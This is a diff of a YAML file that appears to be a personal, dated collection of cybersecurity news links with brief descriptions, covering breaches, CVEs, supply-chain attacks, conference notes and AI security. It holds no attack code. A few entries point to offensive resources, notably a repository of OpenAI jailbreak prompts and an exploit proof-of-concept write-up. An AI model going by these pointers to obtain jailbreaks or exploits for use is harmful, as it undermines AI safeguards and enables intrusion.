+    link: https://arstechnica.com/security/2025/05/hundreds-of-e-commerce-sites-hacked-in-supply-chain-attack/?utm_source=tldrinfosec
+  - desc: 'Hacker Conversations: John Kindervag, a Making not Breaking Hacker Minds
+      and motivations of a hacker -- To demonstrate Kindervag’s alignment with Wark’s
+      definition of hacking, although not for that purpose, he described the creation
+      of Unix as ‘a hack’.'
+    link: https://www.securityweek.com/hacker-conversations-john-kindervag-a-making-not-breaking-hacker
+- date: '2025-05-06'
+  news-items:
+  - desc: A perfect cybersecurity startup idea - good blog on what to consider when
+      doing a security startup. Like ideas around wireguard, eBPF, OSQuery.
+    link: https://ventureinsecurity.net/p/a-perfect-cybersecurity-startup-idea
+  - desc: 65-year-old 'never had money' as a kid—and says that helped him become a
+      CEO worth $11 billion Zscalar Jay Chaudhary - Security Founders
+    link: https://www.cnbc.com/2024/07/19/tech-ceo-never-had-money-as-a-farm-kid-now-hes-worth-11-billion.html
+  - desc: Microsoft finds default Kubernetes Helm charts can expose data
+    link: https://www.bleepingcomputer.com/news/security/microsoft-finds-default-kubernetes-helm-charts-can-expose-data/
+  - desc: 'Kube-Policies: Guardrails for Apps Running in Kubernetes'
+    link: https://developer.squareup.com/blog/kube-policies-guardrails-for-apps-running-in-kubernetes/
+  - desc: 'AI Domination: RSAC 2025 Social Media Roundup [[05-RSAC2025]]'
+    link: https://www.darkreading.com/cloud-security/ai-rsac-2025-social-media-roundup
 - date: '2025-05-05'
   news-items:
-  - desc: 'BSides Seattle 2025: Rebuilding Trust in Systems In The Age Of NHIs'
-    link: https://blog.gitguardian.com/bsides-seattle-2025/?utm_source=tldrinfosec
-  - desc: 'The Future of Cloud & Security Operations: Analyzing PANW’s Cortex Cloud
-      Bet'
-    link: https://softwareanalyst.substack.com/p/the-future-of-cloud-and-security?utm_source=tldrinfosec
-  - desc: Cyber Security Company CEO Arrested for Installing Malware Onto Hospital
-      Computers
-    link: https://cybersecuritynews.com/cyber-security-company-ceo-arrested
-  - desc: 'Microsoft CEO says up to 30% of the company''s code was written by AI #ai-news'
-    link: https://techcrunch.com/2025/04/29/microsoft-ceo-says-up-to-30-of-the-companys-code-was-written-by-ai/
-  - desc: 'When /etc/h*sts Breaks Your Substack Editor: An Adventure in Web Content
-      Filtering'
-    link: https://scalewithlee.substack.com/p/when-etchsts-breaks-your-substack
-  - desc: Vulnerability Exploitation Is Shifting in 2024-25
-    link: https://www.darkreading.com/vulnerabilities-threats/vulnerability-exploitation-shifting-2024-25
+  - desc: RSA Day Summary [[05-RSAC2025]]
+    link: https://www.securityweek.com/rsa-conference-2025-announcements-summary-part-3/amp/
+  - desc: 'Exclusive: Dating app Raw exposed users'' location data and personal information'
+    link: https://techcrunch.com/2025/05/02/dating-app-raw-exposed-users-location-data-personal-information/?utm_source=tldrinfosec
+  - desc: Signal v. Noise in the RSA Innovation Sandbox Sandbox was won by Nuclei
+      creators. However they have to take controversial $5 million funding to be a
+      finalist. Blackhat finalists dont have to [[05-RSAC2025]] Link to visual
+    link: https://www.returnonsecurity.com/p/signal-v-noise-rsa-innovation-sandbox
+  - desc: Signal v. Noise in the RSA Innovation Sandbox Sandbox was won by Nuclei
+      creators. However they have to take controversial $5 million funding to be a
+      finalist. Blackhat finalists dont have to [[05-RSAC2025]] Link to visual
+    link: https://www.blackhat.com/us-24/spotlight.html
+  - desc: Signal v. Noise in the RSA Innovation Sandbox Sandbox was won by Nuclei
+      creators. However they have to take controversial $5 million funding to be a
+      finalist. Blackhat finalists dont have to [[05-RSAC2025]] Link to visual
+    link: https://app.napkin.ai/page/CgoiCHByb2Qtb25lEiwKBFBhZ2UaJDc3ODJhNThjLWU3NzYtNDNiYi1hMDQwLTJjNzMyZDkxYWIyZQ?s=1
+- date: '2025-05-03'
+  news-items:
   - desc: My SIEM-Agnostic Creative Process to Detection Engineering
     link: https://www.cyberseccafe.com/p/my-siem-agnostic-creative-process?utm_source=tldrinfosec
   - desc: 'Vibe Hacking: Finding Auth Bypass and RCE in Open Game Panel'
     link: https://projectblack.io/blog/vibe-hacking-open-game-panel-rce/?utm_source=tldrinfosec
   - desc: 5%- report- OX 2025 Application Security Benchmark Report
     link: https://www.ox.security/ox-2025-application-security-benchmark-report/
-  - desc: 'RSA Day #3 Summary RSA2025'
-    link: https://www.securityweek.com/rsa-conference-2025-announcements-summary-part-3/amp/
-  - desc: 'Exclusive: Dating app Raw exposed users'' location data and personal information'
-    link: https://techcrunch.com/2025/05/02/dating-app-raw-exposed-users-location-data-personal-information/?utm_source=tldrinfosec
-  - desc: Signal v. Noise in the RSA Innovation Sandbox Sandbox was won by Nuclei
-      creators. However they have to take controversial $5 million funding to be a
-      finalist. Blackhat finalists dont have to RSA2025 Link to visual
-    link: https://www.returnonsecurity.com/p/signal-v-noise-rsa-innovation-sandbox
+- date: '2025-04-30'
+  news-items:
+  - desc: Cyber Security Company CEO Arrested for Installing Malware Onto Hospital
+      Computers
+    link: https://cybersecuritynews.com/cyber-security-company-ceo-arrested
+  - desc: Microsoft CEO says up to 30% of the company's code was written by AI
+    link: https://techcrunch.com/2025/04/29/microsoft-ceo-says-up-to-30-of-the-companys-code-was-written-by-ai/
+  - desc: 'When /etc/h*sts Breaks Your Substack Editor: An Adventure in Web Content
+      Filtering'
+    link: https://scalewithlee.substack.com/p/when-etchsts-breaks-your-substack
+  - desc: Vulnerability Exploitation Is Shifting in 2024-25
+    link: https://www.darkreading.com/vulnerabilities-threats/vulnerability-exploitation-shifting-2024-25
+- date: '2025-04-29'
+  news-items:
+  - desc: 'BSides Seattle 2025: Rebuilding Trust in Systems In The Age Of NHIs'
+    link: https://blog.gitguardian.com/bsides-seattle-2025/?utm_source=tldrinfosec
+  - desc: 'The Future of Cloud & Security Operations: Analyzing PANW’s Cortex Cloud
+      Bet'
+    link: https://softwareanalyst.substack.com/p/the-future-of-cloud-and-security?utm_source=tldrinfosec
 - date: '2025-04-24'
   news-items:
-  - desc: More than 560,000 people were impacted across four healthcare data breaches
-      involving Hillcrest Convalescent Center, Gastroenterology Associates of Central
-      Florida, Community Care Alliance, and Sunflower Medical Group.
+  - desc: The Real Internet of Things | Daniel Miessler
+    link: https://danielmiessler.com/blog/the-real-internet-of-things
+  - desc: OpenAI Jailbreaks by Pliny [[33.Q3 Security CTF+Hackathon]]
+    link: https://github.com/elder-plinius/L1B3RT4S/blob/main/OPENAI.mkd
+  - desc: How I Used AI to Create a Working Exploit for CVE-2025-32433 Before Public
+      PoCs Existed
+    link: https://platformsecurity.com/blog/CVE-2025-32433-poc
+  - desc: ICE Is Paying Palantir $30 Million to Build ‘ImmigrationOS’ Surveillance
+      Platform
+    link: https://www.wired.com/story/ice-palantir-immigrationos/
+  - desc: 'splx-ai/agentic-radar: A security scanner for your LLM agentic workflows
+      [[33.Q3 Security CTF+Hackathon]]'
+    link: https://github.com/splx-ai/agentic-radar
+  - desc: Kubernetes Pods Are Inheriting Too Many Permissions [[13.Q2 SSDLC Training]]
+    link: https://www.darkreading.com/cloud-security/kubernetes-pods-inheriting-permissions
+- date: '2025-04-23'
+  news-items:
+  - desc: Attacking My Landlord's Boiler - videah's blog
+    link: https://blog.videah.net/attacking-my-landlords-boiler/?utm_source=tldrinfosec
+  - desc: Bug hunter obtains an SSL cert for Alibaba Cloud in 5 steps
+    link: https://www.theregister.com/2025/04/22/ssl_com_validation_flaw/?utm_source=tldrinfosec
+- date: '2025-04-22'
+  news-items:
+  - desc: Testing Kubernetes Security insecure AKS in action with atomic red team
+    link: https://github.com/latiotech/insecure-kubernetes-deployments
+  - desc: 'CTI Nuggets - RedCanary Intelligence Insights: March 2025 ,pan-unit42/playbook_viewer,
+      MISP Open Source Threat Intelligence Platform & Open Standards For Threat Information
+      Sharing Crowdstrike threat report from FIRST CTI Conference in Europe'
+    link: https://redcanary.com/blog/threat-intelligence/intelligence-insights-march-2025/
+  - desc: 'CTI Nuggets - RedCanary Intelligence Insights: March 2025 ,pan-unit42/playbook_viewer,
+      MISP Open Source Threat Intelligence Platform & Open Standards For Threat Information
+      Sharing Crowdstrike threat report from FIRST CTI Conference in Europe'
+    link: https://github.com/pan-unit42/playbook_viewer?tab=readme-ov-file
+  - desc: 'CTI Nuggets - RedCanary Intelligence Insights: March 2025 ,pan-unit42/playbook_viewer,
+      MISP Open Source Threat Intelligence Platform & Open Standards For Threat Information
+      Sharing Crowdstrike threat report from FIRST CTI Conference in Europe'
+    link: https://www.misp-project.org/
+  - desc: 'CTI Nuggets - RedCanary Intelligence Insights: March 2025 ,pan-unit42/playbook_viewer,
+      MISP Open Source Threat Intelligence Platform & Open Standards For Threat Information
+      Sharing Crowdstrike threat report from FIRST CTI Conference in Europe'
+    link: https://www.crowdstrike.com/en-us/global-threat-report/
+  - desc: 'CTI Nuggets - RedCanary Intelligence Insights: March 2025 ,pan-unit42/playbook_viewer,
+      MISP Open Source Threat Intelligence Platform & Open Standards For Threat Information
+      Sharing Crowdstrike threat report from FIRST CTI Conference in Europe'
+    link: https://m.youtube.com/watch?v=2pSjbSx8J1Q
+- date: '2025-04-21'
+  news-items:
+  - desc: Link
+    link: https://www.darkreading.com/cloud-security/7-rsac-2025-cloud-security-sessions
+  - desc: Link
+    link: https://www.securityweek.com/insurance-firm-lemonade-says-api-glitch-exposed-some-drivers-license-numbers/
+  - desc: Link
+    link: https://platformsecurity.com/blog/CVE-2025-32433-poc
+  - desc: Link
+    link: https://hackread.com/2025-top-osint-tools-take-on-open-source-intel/
+- date: '2025-04-17'
+  news-items:
+  - desc: Pillar Security raises $9M in Seed funding to tackle AI-specific cyber threats
+      9M for AI Security
+    link: https://www.calcalistech.com/ctechnews/article/hklv8g6cje
+  - desc: Security Operations with RunReveal's MCP Server
+    link: https://blog.runreveal.com/security-operations-with-runreveals-mcp-server/?utm_source=tldrinfosec
+  - desc: Tier Zero Security
+    link: https://tierzerosecurity.co.nz/2025/04/14/edv.html?utm_source=tldrinfosec
+  - desc: 'Thousands of AWS records found: keys used in ransomware attacks'
+    link: https://cybernews.com/security/aws-cloud-storage-bucket-ransomware-attacks/?utm_source=tldrinfosec
+- date: '2025-04-15'
+  news-items:
+  - desc: Incident AI Raises $62M
+    link: https://incident.io/blog/incident.io-raises-62m
+  - desc: China accusses NSA for Asian Winter Games attacks
+    link: https://www.metacurity.com/china-accuses-nsa-of-advanced-cyberattacks-during-the-asian-winter-games
+- date: '2025-04-14'
+  news-items:
+  - desc: '!189_-_04-14-2025_-_Funding.png (1164×818) Tailscale raises $160M.'
+    link: https://beehiiv-images-production.s3.amazonaws.com/uploads/asset/file/a9761d24-4808-4186-a7bf-086620581b96/189_-_04-14-2025_-_Funding.png?t=1744621994&utm_source=returnonsecurity.com&utm_medium=newsletter&utm_campaign=security-funded-189-cool-quantum-croissants&_bhlid=30f9f3817303064e151e8262140c0aba21e204fb
+  - desc: 'francisconeves97/jxscout: jxscout superpowers JavaScript analysis for security
+      researchers'
+    link: https://github.com/francisconeves97/jxscout?utm_source=tldrinfosec
+  - desc: 1.6 Million People Impacted by Data Breach at Laboratory Services Cooperative
+    link: https://www.securityweek.com/1-6-million-people-impacted-by-data-breach-at-laboratory-services-cooperative/?utm_source=tldrinfosec
+  - desc: Defeating Prompt Injections by Design
+    link: https://arxiv.org/abs/2503.18813?utm_source=substack&utm_medium=email#
+  - desc: 10 Bugs Found in Perplexity AI's Chatbot Android App Found by Appknox |
+      World’s No. 1 Mobile App Security Testing Solution
+    link: https://www.darkreading.com/application-security/11-bugs-found-perplexity-chatbots-android-app?utm_source=tldrinfosec
+  - desc: 10 Bugs Found in Perplexity AI's Chatbot Android App Found by Appknox |
+      World’s No. 1 Mobile App Security Testing Solution
+    link: https://www.appknox.com/
+- date: '2025-04-10'
+  news-items:
+  - desc: 'Program: Cybersecurity Intelligence and Information Security, M.S. - University
+      of South Florida - Modern Campus Catalog™ [[06.Q2 CIS-60]]'
+    link: https://catalog.usf.edu/preview_program.php?catoid=22&poid=11302
+  - desc: Internship Opportunities [[06.Q2 CIS-60]]
+    link: https://www.linkedin.com/posts/gabriel-hanzel-sello_nasa-lspace-program-nasa-lspace-program-activity-7315511791613014016-wmSc
+- date: '2025-04-09'
+  news-items:
+  - desc: Ghidra MCP
+    link: https://github.com/LaurieWired/GhidraMCP
+- date: '2025-04-08'
+  news-items:
+  - desc: Texas State Bar Breach👩‍⚖️, Outlaw Linux Malware 🐧, Scattered Spider Members
+      Pleads Guilty 🕷️ TLDR Expand
+    link: https://a.tldrnewsletter.com/web-version?ep=1&lc=f831dd92-0408-11ee-9cd0-699389849e5c
+  - desc: Security Weekly
+    link: https://pages.cyberriskalliance.com/index.php/email/emailWebview?email=MTg4LVVOWi02NjAAAAGZtjC0Vj66vDpTFtXb_bo5e6Vfs5NNsWK6vjJ4zXxP_ucptbUrPxBWzKC5K-2rq1UgbFcLDlfMihznuHxpciNOAncXWCqBpl886w
+  - desc: Google Announces Sec Gemini v1
+    link: https://security.googleblog.com/2025/04/google-launches-sec-gemini-v1-new.html
+  - desc: Slow Collapse of Critical Thinking in OSINT due to AI
+    link: https://www.dutchosintguy.com/post/the-slow-collapse-of-critical-thinking-in-osint-due-to-ai
+  - desc: Underage Deepfakes Exposed 👶, Finding Evil in Memory 😈, AI Finds GRUB2 Flaws
+      🤖
+    link: https://a.tldrnewsletter.com/web-version?ep=1&lc=f831dd92-0408-11ee-9cd0-699389849e5c&p=040020ea-1134-11f0-acb5-77912f9b6ef3&pt=campaign&t=1743772508&s=0e6ebececfd22c73f9de99c7a22ca421c3e22524c394150ac14667f704440cbb
+  - desc: Oracle Second Hack 👁️‍🗨️, Taming ML Wild West 🤠, ChatGPT Creates Fake Passport
+      🛂
+    link: https://a.tldrnewsletter.com/web-version?ep=1&lc=f831dd92-0408-11ee-9cd0-699389849e5c&p=4983185c-139b-11f0-820e-fd235446a62c&pt=campaign&t=1744032074&s=5dc3e1f9b38b02c7392d7a72d19380625d4c55613a19d6bcec81b2b0d84ae659
+  - desc: Autonomous SOC Analyst Product
+    link: https://www.dropzone.ai/
+  - desc: Story of signal from Increment @ Stripe [[11-CTI]]
+    link: https://increment.com/security/story-of-signal/
+- date: '2025-04-07'
+  news-items:
+  - desc: Must read books in tech and IT [[00.book-summarizer]]
+    link: https://www.returnonsecurity.com/p/must-read-list
+- date: '2025-04-06'
+  news-items:
+  - desc: Original post [[06.Q2 CIS-60]]
+    link: https://www.linkedin.com/posts/filipstojkovski_here-a-recap-of-some-great-reading-resources-activity-7314240881539145730-oFU9
+- date: '2025-04-04'
+  news-items:
+  - desc: Microsoft Opensources Red Teaming Agent
+    link: https://devblogs.microsoft.com/foundry/ai-red-teaming-agent-preview/
+- date: '2025-04-03'
+  news-items:
+  - desc: CVE-2024-27564 Actively Exploited in the Wild OpenAI vulnerability (SSRF)
+      exploited for Healthcare hacking, this video shows the exploit in action.
+    link: https://veriti.ai/blog/veriti-research/cve-2024-27564-actively-exploited/
+  - desc: CVE-2024-27564 Actively Exploited in the Wild OpenAI vulnerability (SSRF)
+      exploited for Healthcare hacking, this video shows the exploit in action.
+    link: https://www.youtube.com/watch?v=R9zsRGYc2PA
+  - desc: Hackers abuse WordPress MU-Plugins to hide malicious code Wordpress plugins
+      - rabbit hole.
+    link: https://www.bleepingcomputer.com/news/security/hackers-abuse-wordpress-mu-plugins-to-hide-malicious-code/
+- date: '2025-04-01'
+  news-items:
+  - desc: iOS Dating App compromise
+    link: https://cybernews.com/security/ios-dating-apps-leak-private-photos/
+  - desc: Pillage registry
+    link: https://github.com/antitree/go-pillage-registries
+  - desc: TMBench
+    link: https://www.tmbench.com/about?utm_source=tldrinfosec
+- date: '2025-03-31'
+  news-items:
+  - desc: Oracle Health breach compromises patient data at US hospitals
+    link: https://www.bleepingcomputer.com/news/security/oracle-health-breach-compromises-patient-data-at-us-hospitals/
+  - desc: 'CVE-2025-1974: The IngressNightmare in Kubernetes | Wiz Blog'
+    link: https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities
+  - desc: CVE-2025-29927
+    link: https://nextjs.org/blog/cve-2025-29927
+- date: '2025-03-27'
+  news-items:
+  - desc: New npm attack poisons local packages with backdoors
+    link: https://www.bleepingcomputer.com/news/security/new-npm-attack-poisons-local-packages-with-backdoors/
+  - desc: New Atlantis AIO platform automates credential stuffing on 140 services
+    link: https://www.bleepingcomputer.com/news/security/new-atlantis-aio-automates-credential-stuffing-on-140-services/
+  - desc: macOS Users Warned of New Versions of ReaderUpdate Malware
+    link: https://www.securityweek.com/macos-users-warned-of-new-versions-of-readerupdate-malware/?utm_source=tldrinfosec
+  - desc: 'Scaling Threat Modeling with AI: Generating 1000 Threat Models Using Gemini
+      2.0 and AI Security Analyzer'
+    link: https://xvnpw.github.io/posts/scaling-threat-modeling-with-ai
+  - desc: Security on the path to AGI
+    link: https://openai.com/index/security-on-the-path-to-agi/
+  - desc: DarkwebDaily.live
+    link: https://www.linkedin.com/posts/sam-bent_darkweb-cybersecurity-osint-activity-7303390694172209152-3jMF/
+  - desc: Digital Safety - How to protect your online identity
+    link: https://www.youtube.com/watch?app=desktop&v=o9uFeVVIiVg
+  - desc: 'A Free OSINT Lesson: Search Indexes, Record Shops, and Flipping through
+      Vinyl'
+    link: https://www.bullshithunting.com/p/a-free-osint-lesson-search-indexes
+  - desc: Critical Ingress NGINX Controller Vulnerability Allows RCE Without Authentication
+    link: https://thehackernews.com/2025/03/critical-ingress-nginx-controller.htm
+  - desc: Over 3 million applicants’ data leaked on NYU’s website
+    link: https://nyunews.com/news/2025/03/22/nyu-website-hacked-data-leak
+  - desc: 'BountySecurity/BountyPrompt: Bounty Prompt is an Open-Source Burp Suite
+      extension by Bounty Security that leverages advanced AI via Burp AI and Groq
+      AI'
+    link: https://github.com/BountySecurity/BountyPrompt
+  - desc: DryRun Security vs. Traditional SAST Vendors in Ruby on Rails
+    link: https://www.dryrun.security/blog/dryrun-security-vs-traditional-sast-vendors-in-ruby-on-rails
+  - desc: 'Securing AI agents: authentication patterns for Operator and computer using
+      models — WorkOS'
+    link: https://workos.com/blog/securing-ai-agents-operator-models-and-authentication
+- date: '2025-03-20'
+  news-items:
+  - desc: 'Major leak: sperm bank California Cryobank suffers data breach'
+    link: https://cybernews.com/security/sperm-bank-california-cryobank-data-breach/
+  - desc: Use one Virtual Machine to own them all — active exploitation of ESXicape
+    link: https://doublepulsar.com/use-one-virtual-machine-to-own-them-all-active-exploitation-of-esxicape-0091ccc5bdfc
+  - desc: 'New Vulnerability in GitHub Copilot and Cursor: How Hackers Can Weaponize
+      Code Agents'
+    link: https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents
+  - desc: The Great CNAPP Re-bundle
+    link: https://pulse.latio.tech/p/the-great-cnapp-re-bundle?utm_source=tldrinfosec
+- date: '2025-03-18'
+  news-items:
+  - desc: Tomcat Vulnerability and a analysis by Wallarm Labs
+    link: https://thehackernews.com/2025/03/apache-tomcat-vulnerability-comes-under.html
+  - desc: Tomcat Vulnerability and a analysis by Wallarm Labs
+    link: https://lab.wallarm.com/one-put-request-to-own-tomcat-cve-2025-24813-rce-is-in-the-wild/
+  - desc: Attack on Car dealerships
+    link: https://www.securityweek.com/100-car-dealerships-hit-by-supply-chain-attack/
+  - desc: Juniper Routers by China Nexus
+    link: https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-targets-juniper-routers
+  - desc: Fake Captcha
+    link: https://thehackernews.com/2025/03/obscurebat-malware-uses-fake-captcha.html
+  - desc: Supply chain attacks by Lazarus to steal crypto
+    link: https://socket.dev/blog/lazarus-strikes-npm-again-with-a-new-wave-of-malicious-packages
+  - desc: US Treasury got hidden messages in Emojis
+    link: https://slamdunksoftware.substack.com/p/hidden-messages-in-emojis-and-hacking
+- date: '2025-03-17'
+  news-items:
+  - desc: Malicious Code Hits ‘tj-actions/changed-files’ in 23,000 GitHub Repos
+    link: https://hackread.com/malicious-code-in-tj-actions-changed-files-github-repos/
+- date: '2025-03-13'
+  news-items:
+  - desc: 560,000 People Impacted Across Four Healthcare Data Breaches More than 560,000
+      people were impacted across four data breaches disclosed last week to authorities
+      by the healthcare organizations Hillcrest Convalescent Center, Gastroenterology
+      Associates of Central Florida, Community Care Alliance, and Sunflower Medical
+      Group.
     link: https://www.securityweek.com/560000-people-impacted-across-four-healthcare-data-breaches/?utm_source=tldrinfosec
+  - desc: 560,000 People Impacted Across Four Healthcare Data Breaches More than 560,000
+      people were impacted across four data breaches disclosed last week to authorities
+      by the healthcare organizations Hillcrest Convalescent Center, Gastroenterology
+      Associates of Central Florida, Community Care Alliance, and Sunflower Medical
+      Group.
+    link: https://www.securityweek.com/topics/healthcare/
   - desc: US cities warn of wave of unpaid parking phishing texts I got one of these!
     link: https://www.bleepingcomputer.com/news/security/us-cities-warn-of-wave-of-unpaid-parking-phishing-texts/?utm_source=tldrinfosec
-  - desc: AI Agents for Detection EngineeringOriginal post 06.Q2 CIS-60
-    link: https://security.googleblog.com/2025/04/google-launches-sec-gemini-v1-new.html?m=1
-  - desc: TracecatHQ/tracecat
-    link: https://github.com/TracecatHQ/tracecat
-  - desc: MCP and Security Operations
-    link: https://www.detectionatscale.com/p/mcp-and-security-operations
-  - desc: 'Becoming a Detection Engineering Contractor Part II: The Preparation'
-    link: https://detect.fyi/becoming-a-detection-engineering-contractor-part-ii-the-preparation-4385c58c1d15
-  - desc: SOC AI Agents
-    link: https://www.cybersec-automation.com/p/soc-ai-agents
-  - desc: 'The Return of the Baby ASO: Why SOCs Still Suck'
-    link: https://medium.com/anton-on-security/the-return-of-the-baby-aso-why-socs-still-suck-07e66f2ee023
-  - desc: Defeating Prompt Injections by Design
-    link: https://security.googleblog.com/2025/04/google-launches-sec-gemini-v1-new.html
-- date: '2025-03-07'
-  news-items:
-  - desc: Flightradar24 experiences ongoing DDoS cyberattack.
-    link: https://www.paddleyourownkanoo.com/2025/03/05/the-worlds-most-popular-flight-tracker-is-fighting-an-ongoing-ddos-cyber-attack
-  - desc: New 'polyglot' malware targets aviation and satellite communication firms.
-    link: https://www.bleepingcomputer.com/news/security/new-polyglot-malware-hits-aviation-satellite-communication-firms
-  - desc: Apartment buildings are been broken into within minutes using IoT-connected
-      intercoms with default credentials, leaving them vulnerable to anyone with Google.
-    link: https://www.tomshardware.com/tech-industry/cyber-security/apartment-buildings-broken-into-with-phone-in-minutes-iot-connected-intercoms-using-default-creds-vulnerable-to-anyone-with-google
-- date: '2025-02-28'
-  news-items:
-  - desc: ByBit (1.5 Billion Hack) linked to North Korea.
-    link: https://apnews.com/article/bybit-exchange-crypto-hack-north-korea-7c8335c1397261554138090c2c38f457
-  - desc: Skybox Security shuts down and lays off entire workforce.
-    link: https://www.securityweek.com/skybox-security-shuts-down-lays-off-entire-workforce/
-  - desc: Black Basta ransomware group's internal chats leaked.
-    link: https://www.theregister.com/2025/02/21/experts_race_to_extract_inte
-  - desc: LLM dataset found to contain over 12,000 API keys and passwords.
-    link: https://thehackernews.com/2025/02/12000-api-keys-and-passwords-found-in.html
-  - desc: New 'Pass-the-cookie' exploit bypasses multi-factor authentication.
-    link: https://gbhackers.com/new-pass-the-cookie-attacks-bypass-mfa/#google_vignette
-  - desc: ChatGPT vulnerable to operator prompt injection.
-    link: https://cybersecuritynews.com/chatgpt-operator-prompt-injection/
-  - desc: LLM injection attacks highlighted by 'Indiana Jones jailbreak' approach.
-    link: https://techxplore.com/news/2025-02-indiana-jones-jailbreak-approach-highlights.html
-  - desc: Russian threat groups targeting Ukraine's Signal communications.
-    link: https://cyberscoop.com/russia-threat-groups-target-ukraine-signal
-  - desc: Apple and UK government clash over end-to-end encryption.
-    link: https://www.cnn.com/2025/02/25/tech/apple-advanced-data-protection-uk-encryption/index.html
+  - desc: Google Pays Out Nearly $12M in 2024 Bug Bounty Program Lets to bug hunting!
+    link: https://www.darkreading.com/vulnerabilities-threats/google-pays-nearly-12m-2024-bug-bounty-program
+  - desc: Undocumented commands found in Bluetooth chip used by a billion devices
+      Hardware Hacking
+    link: https://www.bleepingcomputer.com/news/security/undocumented-commands-found-in-bluetooth-chip-used-by-a-billion-devices/
+  - desc: Ethereum private key stealer on PyPI downloaded over 1,000 times Supply
+      chain attack!
+    link: https://www.bleepingcomputer.com/news/security/ethereum-private-key-stealer-on-pypi-downloaded-over-1-000-times/
 - date: '2025-02-20'
   news-items:
-  - desc: Russia's Sandworm conducting 'BadPilot campaign' targeting US and European
-      organizations in energy and telecommunications sectors, exploiting vulnerabilities
-      to maintain access and support military objectives
-    link: https://therecord.media/sandworm-subgroup-russia-europe
-  - desc: Trump Hotels guest information leaked on hacker forum by threat actor 'FutureSeeker',
-      known for similar data dumps
-    link: https://leakd.com/leaks/trump-hotels-guest-information-leaked-on-hacker-forum/
-  - desc: Vulnerability (CVE-2025-0994) in Trimble Cityworks tool used by local governments
-      discovered, potentially allowing RCE against customer IIS servers
-    link: https://therecord.media/hackers-exploiting-trimble-cityworks-bug-used-by-local-govs
-  - desc: Researchers detail $50K software supply chain hack involving exposed NPM_TOKEN
-      in Docker image build layers
-    link: https://www.landh.tech/blog/20250211-hack-supply-chain-for-50k/
-  - desc: Research highlights ongoing security concerns with PDF features and potential
-      attack vectors
-    link: https://web-in-security.blogspot.com/2021/01/insecure-features-in-pdfs.html
-  - desc: JPMorgan Chase announces plans to block Zelle payments to social media contacts
-      to combat rising online payment fraud
-    link: https://www.bleepingcomputer.com/news/security/chase-will-soon-block-zelle-payments-to-sellers-on-social-media/
-  - desc: Elon Musk's Dogecoin website discovered to be vulnerable to defacement due
-      to unrestricted editing capabilities
+  - desc: Elon Musk’s DOGE website has been defaced because anyone can edit it
     link: https://www.theverge.com/news/612865/doge-government-website-database-security-open
-  - desc: Pig Butchering cryptocurrency scams show 40% year-over-year revenue growth
-      with increased sophistication
+  - desc: 2024 Pig Butchering Crypto Scam Revenue Grows 40% YoY as Industry Increases
+      Sophistication
     link: https://www.chainalysis.com/blog/2024-pig-butchering-scam-revenue-grows-yoy
-  - desc: Security researchers identify malicious machine learning models uploaded
-      to Hugging Face platform
+  - desc: Malicious ML models discovered on Hugging Face platform
     link: https://www.reversinglabs.com/blog/rl-identifies-malware-ml-model-hosted-on-hugging-face
-  - desc: Russian state-sponsored threat actor reportedly shifting focus to targeting
-      US and UK assets
+  - desc: Russian state threat group shifts focus to US, UK targets
     link: https://cyberscoop.com/russian-state-threat-group-shifts-focus/
-  - desc: Slop and Flop attacks emerge as a new security threat, though details on
-      their execution and impact remain scarce.
-    link: https://predictors.fail/
-  - desc: Cryptocurrency and blockchain hacker report highlights that bug bounties
-      in the sector outpay other industries. Around 10% of vulnerabilities stem from
-      business logic flaws, compared to 2% in other sectors. Crypto.com runs $2 million
-      in bug bounties.
-    link: https://www.hackerone.com/resources/reporting/8th-hacker-powered-security-report-cryptocurrency-blockchain
-  - desc: Apple patches a zero-day vulnerability related to USB Restricted Mode, which
-      was actively exploited in highly sophisticated attacks.
-    link: https://www.bleepingcomputer.com/news/apple/apple-fixes-zero-day-exploited-in-extremely-sophisticated-attacks
-  - desc: Ken Huang releases Maestro, a seven-layer threat modeling tool for Agentic
-      AI, designed for continuous security assessment.
-    link: https://cloudsecurityalliance.org/blog/2025/02/06/agentic-ai-threat-modeling-framework-maestro
-  - desc: A WatchTowr researcher discovered over 150 abandoned sensitive S3 buckets
-      from software companies, governments, and infrastructure pipelines, exposing
-      critical data.
-    link: https://labs.watchtowr.com/8-million-requests-later-we-made-the-solarwinds-supply-chain-attack-look-amateur/
-  - desc: Over 12,000 KerioControl firewalls remain vulnerable to an RCE flaw despite
-      GFI Software's security update on December 19, 2024. According to Censys, over
-      23,800 instances are still at risk.
-    link: https://censys.com/cve-2024-52875/
-  - desc: Toll booth scammers continue to exploit users through fraudulent SMS messages,
-      tricking victims into making false payments.
-    link: https://www.bitdefender.com/en-us/blog/hotforsecurity/toll-booth-bandits-continue-to-scam-via-sms-messages
-  - desc: A massive brute-force attack, utilizing 2.8 million IPs—mostly from Brazil—targets
-      VPN devices, highlighting ongoing security risks.
-    link: https://www.bleepingcomputer.com/news/security/massive-brute-force-attack-uses-28-million-ips-to-target-vpn-devices
+- date: '2025-02-19'
+  news-items:
+  - desc: Chase will soon block Zelle payments to sellers on social media JPMorgan
+      Chase Bank (Chase) will soon start blocking Zelle payments to social media contacts
+      to combat a significant rise in online scams utilizing the service for fraud.
+    link: https://www.bleepingcomputer.com/news/security/chase-will-soon-block-zelle-payments-to-sellers-on-social-media/
+- date: '2025-02-14'
+  news-items:
+  - desc: Insecure Features in PDFs Old but gold! PDF attacks.
+    link: https://web-in-security.blogspot.com/2021/01/insecure-features-in-pdfs.html
 - date: '2025-02-13'
   news-items:
-  - desc: More than 560,000 people were impacted across four healthcare data breaches
-      involving Hillcrest Convalescent Center, Gastroenterology Associates of Central
-      Florida, Community Care Alliance, and Sunflower Medical Group.
-    link: https://www.securityweek.com/560000-people-impacted-across-four-healthcare-data-breaches/?utm_source=tldrinfosec
-  - desc: US cities warn of a surge in phishing scams involving fake unpaid parking
-      tickets. Attackers are sending fraudulent SMS messages to steal payment details.
-    link: https://www.bleepingcomputer.com/news/security/us-cities-warn-of-wave-of-unpaid-parking-phishing-texts/?utm_source=tldrinfosec
-  - desc: Google paid nearly $12 million in bug bounties during 2024, highlighting
-      the importance of vulnerability research and responsible disclosure.
-    link: https://www.darkreading.com/vulnerabilities-threats/google-pays-nearly-12m-2024-bug-bounty-program
-  - desc: Undocumented commands were discovered in a widely used Bluetooth chip, potentially
-      impacting over a billion devices and raising concerns about hardware security
-      vulnerabilities.
-    link: https://www.bleepingcomputer.com/news/security/undocumented-commands-found-in-bluetooth-chip-used-by-a-billion-devices/
